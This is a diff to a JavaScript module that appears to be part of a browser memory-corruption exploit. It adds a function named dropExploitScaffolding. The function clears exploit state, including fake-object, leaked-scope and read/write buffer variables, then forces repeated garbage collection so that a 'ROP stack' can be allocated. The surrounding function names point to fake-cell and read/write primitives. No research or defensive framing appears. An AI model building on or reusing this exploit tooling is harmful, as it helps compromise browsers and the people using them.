@@ -1327,6 +1327,40 @@ export function fakeCellReleased() {
     return fakeReleased;
 }
 
+// Drop everything the pair no longer needs so prepare()'s ROP stack can allocate.
+export function dropExploitScaffolding() {
+    liveCandidate = null;
+    fakeHost = null;
+    lengthWord = null;
+    getterCarrier = null;
+    leakedScope = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    predecessorWords = null;
+    outerGraph = null;
+    fillerGraph = null;
+    referenceTarget = null;
+    keepAlive = null;
+    anchorElement = null;
+    markerObjectB = null;
+    holderGuardA = null;
+    holderGuardB = null;
+    rwBuffer = null;
+    rwView = null;
+    rwMirror = null;
+    targetBuffer = null;
+    targetView = null;
+    try {
+        history.replaceState(null, "");
+    } catch (_) { }
+    if (typeof globalThis.gc === "function") {
+        for (let i = 0; i < 4; ++i) {
+            try { globalThis.gc(); } catch (_) { }
+        }
+    }
+}
+
 export function carrierHeaderCopy() {
     return rwHeader.slice(0, CELL_BYTES);
 }
